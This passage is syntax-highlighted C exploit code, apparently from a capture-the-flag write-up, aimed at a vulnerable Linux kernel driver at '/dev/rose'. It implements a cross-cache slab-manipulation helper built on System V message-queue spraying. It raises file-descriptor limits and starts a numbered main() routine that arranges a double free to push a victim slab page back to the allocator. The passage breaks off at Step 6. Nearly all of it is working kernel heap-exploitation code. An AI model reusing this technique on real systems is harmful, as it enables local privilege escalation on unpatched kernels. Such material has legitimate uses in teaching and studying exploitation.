</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">reserve_partial_list_amount</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">to_alloc</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">CC_OVERFLOW_FACTOR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_allocate</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">,</span> <span class="n">to_alloc</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">allocate_victim_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">to_alloc</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_allocate</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span><span class="p">,</span> <span class="n">to_alloc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">fill_victim_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">to_alloc</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_allocate</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span><span class="p">,</span> <span class="n">to_alloc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">empty_victim_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">overflow_partial_list</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">CC_OVERFLOW_FACTOR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int64_t</span> <span class="nf">free_all</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">to_free</span> <span class="o">=</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span><span class="o">*</span> <span class="n">CC_OVERFLOW_FACTOR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_free</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">,</span> <span class="n">to_free</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">empty_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int64_t</span> <span class="nf">cc_next</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">phase</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">CC_RESERVE_PARTIAL_LIST</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">reserve_partial_list_amount</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">CC_ALLOC_VICTIM_PAGE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">allocate_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">CC_FILL_VICTIM_PAGE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">fill_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">CC_EMPTY_VICTIM_PAGE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">empty_victim_page</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">CC_OVERFLOW_PARTIAL_LIST</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">overflow_partial_list</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">cc_deinit</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free_all</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init_msq</span><span class="p">(</span><span class="kt">int64_t</span> <span class="o">*</span><span class="n">repo</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">to_alloc</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">to_alloc</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">msgget</span><span class="p">(</span><span class="n">IPC_PRIVATE</span><span class="p">,</span> <span class="n">IPC_CREAT</span> <span class="o">|</span> <span class="mo">0666</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">repo</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;[-] msgget() fail</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="nf">cc_init</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">objs_per_slab</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="kt">uint32_t</span> <span class="n">cpu_partial</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="kt">void</span> <span class="o">*</span><span class="n">allocate_fptr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                            <span class="kt">void</span> <span class="o">*</span><span class="n">free_fptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">cross_cache</span> <span class="o">*</span><span class="n">cc</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">cross_cache</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">cc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;init_cross_cache:malloc</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">objs_per_slab</span> <span class="o">=</span> <span class="n">objs_per_slab</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">cpu_partial</span> <span class="o">=</span> <span class="n">cpu_partial</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">free</span> <span class="o">=</span> <span class="n">free_fptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">allocate</span> <span class="o">=</span> <span class="n">allocate_fptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">phase</span> <span class="o">=</span> <span class="n">CC_RESERVE_PARTIAL_LIST</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">n_overflow</span> <span class="o">=</span> <span class="n">objs_per_slab</span> <span class="o">*</span> <span class="p">(</span><span class="n">cpu_partial</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">CC_OVERFLOW_FACTOR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">n_previctim</span> <span class="o">=</span> <span class="n">objs_per_slab</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">n_postvictim</span> <span class="o">=</span> <span class="n">objs_per_slab</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="o">*</span> <span class="n">n_overflow</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="o">*</span> <span class="n">n_previctim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="o">*</span> <span class="n">n_postvictim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">init_msq</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">,</span> <span class="n">n_overflow</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="nf">init_msq</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span><span class="p">,</span> <span class="n">n_previctim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">init_msq</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span><span class="p">,</span> <span class="n">n_postvictim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">cc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">rlimit_increase</span><span class="p">(</span><span class="kt">int</span> <span class="n">rlimit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">rlimit</span> <span class="n">r</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">getrlimit</span><span class="p">(</span><span class="n">rlimit</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fatal</span><span class="p">(</span><span class="s">&#34;rlimit_increase:getrlimit&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">&lt;=</span> <span class="n">r</span><span class="p">.</span><span class="n">rlim_cur</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] rlimit %d remains at %.lld&#34;</span><span class="p">,</span> <span class="n">rlimit</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">rlim_cur</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">rlim_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">=</span> <span class="nf">setrlimit</span><span class="p">(</span><span class="n">rlimit</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fatal</span><span class="p">(</span><span class="s">&#34;rlimit_increase:setrlimit&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] rlimit %d increased to %lld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">rlimit</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">rlim_max</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int64_t</span> <span class="nf">cc_alloc_kmalloc1k_msg</span><span class="p">(</span><span class="kt">int64_t</span> <span class="n">msqid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">mtype</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">mtext</span><span class="p">[</span><span class="n">MSG_SIZE</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg</span><span class="p">.</span><span class="n">mtype</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">mtext</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="n">MSG_SIZE</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg</span><span class="p">.</span><span class="n">mtext</span><span class="p">[</span><span class="n">MSG_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">msgsnd</span><span class="p">(</span><span class="n">msqid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">mtext</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">msqid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">cc_free_kmalloc1k_msg</span><span class="p">(</span><span class="kt">int64_t</span> <span class="n">msqid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">mtype</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">mtext</span><span class="p">[</span><span class="n">MSG_SIZE</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg</span><span class="p">.</span><span class="n">mtype</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nf">msgrcv</span><span class="p">(</span><span class="n">msqid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">mtext</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">IPC_NOWAIT</span> <span class="o">|</span> <span class="n">MSG_NOERROR</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">open_rose</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/rose&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">rose_fds</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">freed_fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define NUM_SPRAY_FDS 0x300
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;=======================&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Initial setup&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;echo &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; &gt; /tmp/a&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">rlimit_increase</span><span class="p">(</span><span class="n">RLIMIT_NOFILE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Alloc the first rose
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// This will be used later to trigger double free
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">rose_fds</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open_rose</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;=======================&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Try to free the page&#34;</span><span class="p">);</span> <span class="c1">// Based on https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">kmalloc1k_cc</span> <span class="o">=</span> <span class="nf">cc_init</span><span class="p">(</span><span class="n">OBJS_PER_SLAB</span><span class="p">,</span> <span class="n">CPU_PARTIAL</span><span class="p">,</span> <span class="n">cc_alloc_kmalloc1k_msg</span><span class="p">,</span> <span class="n">cc_free_kmalloc1k_msg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">     <span class="c1">// Step 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Step 1: Allocate a lot of slabs (To be put in the partial list later)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_next</span><span class="p">(</span><span class="n">kmalloc1k_cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Step 2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Step 2: Allocate target slab that we want to discard&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_next</span><span class="p">(</span><span class="n">kmalloc1k_cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Step 3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Step 3: Put rose in the target slab&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">rose_fds</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open_rose</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Step 4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Step 4: Fulfill the target slab until we have a new active slab&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_next</span><span class="p">(</span><span class="n">kmalloc1k_cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Step 5
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Step 5: Try to free rose &amp; other objects with hope that the target slab will be empty + be put in the partial list&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Free rose, but rose_fds[0] also pointing to the same chunk,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// and we can use rose_fds[0] later to free other chunk that resides in here
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">close</span><span class="p">(</span><span class="n">rose_fds</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_next</span><span class="p">(</span><span class="n">kmalloc1k_cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Step 6
